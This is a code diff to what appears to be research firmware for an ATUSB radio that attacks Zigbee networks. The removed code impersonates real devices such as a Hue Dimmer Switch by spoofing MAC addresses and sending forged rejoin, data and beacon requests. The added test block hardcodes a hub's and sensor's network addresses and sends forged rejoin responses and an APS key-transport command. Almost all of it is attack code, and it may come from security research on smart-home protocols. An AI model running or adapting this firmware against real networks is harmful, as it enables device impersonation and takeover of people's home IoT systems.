@@ -10,6 +10,9 @@
  * (at your option) any later version.
  */
 
+#ifndef F_CPU
+#define F_CPU   8000000UL
+#endif
 
 #include <stdint.h>
 
@@ -26,10 +29,6 @@
 #include "atusb/ep0.h"
 
 #include "attack.h"
-
-#ifdef DEBUG
-#include "uart.h"
-#endif
 
 
 int main(void)
@@ -65,42 +64,52 @@ int main(void)
 	* 3. After that, just to board_app.c, we handle IMQ interrupt there, for further beacon request/rejoin request/data request handling.
 	*/
 	sei();
-	union Integer mac_addr;
 	uint8_t rejoin_flag = 4;
-	mac_addr.integer = 200000;
+
+	_delay_ms(3000);
+
+	/** TEST FIELD **/
+	rejoin_flag = 1;
+	// Here we let dst_device = hub, src_device = sensor to test our API
+	ieee802154_addr hub_addr = {};
+	hub_addr.pan = 0x3412;
+	hub_addr.epan = 0x0ab4da5c2ea6d3ec;
+	hub_addr.short_addr = 0x0000;
+	hub_addr.long_addr = 0x286d970002054a14;
+
+	ieee802154_addr sensor_addr = hub_addr;
+	sensor_addr.short_addr = 0x2d38;
+	sensor_addr.long_addr = 0x286d9700010d8ebc;
+
+	// Finally as the user, whenever we send commands, we need to determine whether we will
+	// start RX_AACK mode.
+	rx_aack_config aack_config = {};
+	aack_config.aack_flag = 0;
+	aack_config.dis_ack = 0;
+	aack_config.pending = 0;
+	aack_config.target_short_addr.addr = hub_addr.short_addr;
+	aack_config.target_pan_id.addr = hub_addr.pan;
+
+	/** END OF TEST FIELD **/
 	while (1)
 	{
-		if (rejoin_flag == 4)
+		if (rejoin_flag == 1)
 		{
-		}
-		if (rejoin_flag == 3) // Pretend to be the real ZED device, and set wrong device type (ST Sensor)
-		{
-			_delay_ms(30000);
-			mac_addr.integer = 0xcc7af408; // Hue Dimmer Switch
-			// mac_addr.integer = 0xbc8e0d01; // ST Sensor
-			send_rejoin_request_device(mac_addr, 1);
-			mac_addr.integer = 190000;
-			rejoin_flag = 10; // Fill up with the last garbage
-		}
-		if (rejoin_flag == 2) // Pretend to be a sleepy ZED and send rejoin request
-		{
-			_delay_ms(90000);
-			send_rejoin_request(mac_addr, 0);
-			_delay_ms(100);
-			send_data_request();
-			mac_addr.integer += 1;
-		}
-		else if (rejoin_flag == 1) // Pretend to be a non-sleepy ZED and send rejoin request, then reply ACK
-		{
-			_delay_ms(90000);
-			send_rejoin_request(mac_addr, 1);
-			mac_addr.integer += 1;
-			rejoin_flag = 10;
-		}
-		else if (rejoin_flag == 0) // Send beacon request
-		{
-			_delay_ms(50000);
-			send_beacon_request();
+			_delay_ms(2000);
+			led(1);
+			// send_zbee_cmd(ZBEE_MAC_CMD_DATA_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_MAC_CMD_BEACON_RP, 0, &sensor_addr, &hub_addr, &aack_config);
+			// send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RQ, 0, &sensor_addr, &hub_addr, &aack_config);
+			send_zbee_cmd(ZBEE_NWK_CMD_REJOIN_RP, 0, &sensor_addr, &hub_addr, &aack_config);
+			_delay_ms(2000);
+			led(0);
+
+			_delay_ms(2000);
+			led(1);
+			send_zbee_cmd(ZBEE_APS_CMD_KEY_TRANSPORT, 1, &sensor_addr, &hub_addr, &aack_config);
+			_delay_ms(2000);
+			led(0);
 		}
 		else
 		{
